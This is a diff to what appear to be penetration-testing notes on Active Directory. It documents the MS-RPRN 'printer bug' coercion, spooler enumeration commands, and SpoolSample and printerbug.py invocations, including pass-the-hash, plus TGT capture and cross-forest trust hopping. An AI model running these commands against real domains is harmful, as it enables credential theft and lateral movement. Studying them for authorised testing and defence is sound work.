@@ -247,14 +247,12 @@ python samrdump.py <IP | HOSTNAME>
 python samrdump.py [<DOMAIN>/]<USERNAME>:<PASSWORD>@<IP | HOSTNAME>
 ```
 
-TODO
-
 ### MS-RPRN "printer bug"
 
 The `RpcRemoteFindFirstPrinterChangeNotification(Ex)` function of the
 `Print System Remote Protocol`, exposed on the `MS-RPRN` `MSRPC` interface, can
 be called by any domain user, member of `Authenticated Users`, to force the
-machine running the `SpoolerService` to authenticate, through `NTLM` or
+machine running the `Print Spooler` service to authenticate, through `NTLM` or
 `Kerberos`, to the specified remote system. The authentication is conducted by
 the machine using its machine account.
 
@@ -266,8 +264,11 @@ exploited in a number of ways:
   machine as part of a `Kerberos` authentication, will contain a copy of the
   machine `Ticket-Granting Ticket (TGT)`. This `TGT` can be extracted from the
   `LSASS` process of the controlled machine, and further used to authenticate
-  to any domain resources as the targeted machine account. For more information
-  on the attack, refer to the `[ActiveDirectory] Kerberos delegation` note.
+  to any domain resources as the targeted machine account.
+  This can notably be leveraged to jump `External` and `CrossForest` trusts
+  allowing `TGT` delegation and with `SID Filtering` enabled. For more
+  information on the attack, refer to the `[ActiveDirectory] Kerberos
+  delegation` and `[ActiveDirectory] Trusts hopping` notes.
 
   - If the machine account of the machine exposing the `SpoolerService` is
   member of the local `Administrators` group of remote systems, the captured
@@ -294,13 +295,19 @@ exploited in a number of ways:
 exposing the `MS-RPRN` `MSRPC` interface:
 
 ```
-# Automates the enumeration of the computers in the domain and conducts the check on all the enumerated computers.
-# Refer to the Active Directory - Automatic scanners note for more information on how to use PingCastle.
-PingCastle.exe --scanner spooler
+gci \\<HOSTNAME | IP>\pipe\spoolss
+
+Get-SpoolStatus -ComputerName <IP | HOSTNAME>
 
 rpcdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<IP | HOSTNAME> | grep -i "MS-RPRN"
 
-Get-SpoolStatus -ComputerName <IP | HOSTNAME>
+# Automates the enumeration of the computers in the domain and conducts the check on all the enumerated computers.
+# Refer to the Active Directory - Automatic scanners note for more information on how to use PingCastle.
+PingCastle.exe --scanner spooler
+# Enumerates and scan only the Domain Controllers.
+# The Domain Controllers of another forest can be scanned using the "--server" option.
+PingCastle.exe --scanner spooler --scmode-dc
+PingCastle.exe --scanner spooler --scmode-dc --server <TARGET_FOREST_DC_FQDN>
 ```
 
 The `printerbug.py` Python script, of the `krbrelayx` toolkit, can be used to
@@ -308,10 +315,11 @@ call the `SpoolerService` `MSRPC` functions and trigger the authentication
 callback.
 
 ```
-# In order to trigger a Kerberos authentication, the listening host <LHOST_HOSTNAME> should be associated to a Service Principal Names (SPN) in the domain and a valide DNS record
+# In order to trigger a Kerberos authentication, the listening host <LHOST_HOSTNAME> should be associated to a Service Principal Names (SPN) in the domain and a valid DNS record
 # For more information, refer to the `[ActiveDirectory] Kerberos unconstrained delegation` note   
 
-printerbug.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<TARGET_IP | TARGET_HOSTNAME> <LHOST_IP | LHOST_HOSTNAME>
+SpoolSample.exe <TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
 
-printerbug.py -hashes <LMHASH:NTHASH> [<DOMAIN>/]<USERNAME>@<TARGET_IP | TARGET_HOSTNAME> <LHOST_IP | LHOST_HOSTNAME>
+printerbug.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
+printerbug.py -hashes <LMHASH:NTHASH> [<DOMAIN>/]<USERNAME>@<TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
 ```
